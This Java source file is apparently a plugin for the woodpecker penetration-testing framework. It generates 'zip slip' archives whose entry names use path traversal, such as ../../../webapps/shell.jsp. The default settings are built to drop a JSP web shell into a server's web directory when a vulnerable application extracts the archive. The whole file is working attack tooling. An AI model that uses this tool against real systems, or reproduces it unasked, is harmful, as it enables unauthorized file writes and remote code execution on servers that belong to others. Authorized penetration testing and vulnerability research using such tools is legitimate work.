package me.gv7.woodpecker.plugin;

import me.gv7.woodpecker.tools.common.FileUtil;
import java.io.FileOutputStream;
import java.util.*;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipSlip implements IHelper{
    private final static String COMPRESS_TYPE_DIR = "DIR";
    private IResultOutput resultOutput;

    public String getHelperTabCaption() {
        return "zip slip";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = ZipTools.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = ZipTools.pluginHelper.createArg();
        args1.setName("compress_file_1");
        args1.setDefaultValue("/tmp/shell.jsp");
        args1.setDescription("要压缩的目标");
        args1.setRequired(true);
        args.add(args1);

        IArg compressName = ZipTools.pluginHelper.createArg();
        compressName.setName("compress_file_name_1");
        compressName.setDefaultValue("../../../webapps/shell.jsp");
        compressName.setDescription("解压的路径");
        compressName.setRequired(true);
        args.add(compressName);


        IArg saveFile = ZipTools.pluginHelper.createArg();
        saveFile.setName("save_file");
        saveFile.setDefaultValue("/tmp/evil.zip");
        saveFile.setDescription("生成文件的保存路径");
        saveFile.setRequired(true);
        args.add(saveFile);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void generateEvilZip(Map<String,String> unm,String saveFile) throws Exception{
        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(saveFile));
        zipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
        for(Map.Entry<String,String> un:unm.entrySet()){
            String compressName = un.getKey();//.replace("\\","/");
            String filePath = un.getValue();
            if(filePath.equals(COMPRESS_TYPE_DIR)){
                String dirName = compressName.endsWith("/") || compressName.endsWith("\\") ? compressName : compressName + "/";
                zipOutputStream.putNextEntry(new ZipEntry(dirName));
                zipOutputStream.flush();
                this.resultOutput.infoPrintln(String.format("Compress dir  %s finish",compressName));
            }else{
                zipOutputStream.putNextEntry(new ZipEntry(compressName));
                zipOutputStream.write(FileUtil.readFile(filePath));
                zipOutputStream.flush();
                this.resultOutput.infoPrintln(String.format("Compress file %s to %s finish",filePath,compressName));
            }
        }
        zipOutputStream.close();
    }


    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        this.resultOutput = resultOutput;
        LinkedHashMap<String,String> cus = new LinkedHashMap<String, String>();
        for(int i= 0;i<customArgs.size();i++){
            String compressDirName = String.format("compress_dir_name_%d",i+1);
            String compressFileName = String.format("compress_file_name_%d",i+1);
            String compressFile = String.format("compress_file_%d",i+1);

            if(customArgs.get(compressDirName) != null && customArgs.get(compressFileName) != null){
                resultOutput.errorPrintln(String.format("The serial number of %s and %s cannot be the same",compressDirName,compressFileName));
                return;
            }

            if(customArgs.get(compressFileName) != null && customArgs.get(compressFile) != null){
                cus.put((String)customArgs.get(compressFileName),(String)customArgs.get(compressFile));
            }

            if(customArgs.get(compressDirName) != null){
                cus.put((String)customArgs.get(compressDirName),COMPRESS_TYPE_DIR);
            }
        }

        String saveFile = (String)customArgs.get("save_file");
        generateEvilZip(cus,saveFile);
        resultOutput.successPrintln(String.format("Save file %s success!",saveFile));
    }
}
